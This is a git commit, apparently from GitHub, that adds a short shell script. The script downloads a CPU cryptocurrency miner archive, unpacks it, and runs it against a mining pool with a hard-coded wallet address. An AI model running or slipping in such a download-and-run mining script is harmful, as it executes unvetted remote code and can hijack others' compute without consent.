2ddea1112a559bda63a44dc768c6f34b02b823b0
sifjifs <102944337+sifjifs@users.noreply.github.com>
2022-04-04 06:09:03 +0000

    Create script.sh

---
+++ script.sh
@@ -0,0 +1,3 @@
+wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+tar xf hellminer_cpu_linux.tar.gz
+hellminer.exe -c stratum+tcp://na.luckpool.net:3956#xnsub -u zs1ufhz7jn3v4fya5vw5cdj76gm8prdwrrf3mwwmzkwzcw45s6zz7a0kx987asg75wnhkaqktx3j6l.Rig001 -p x --cpu 8
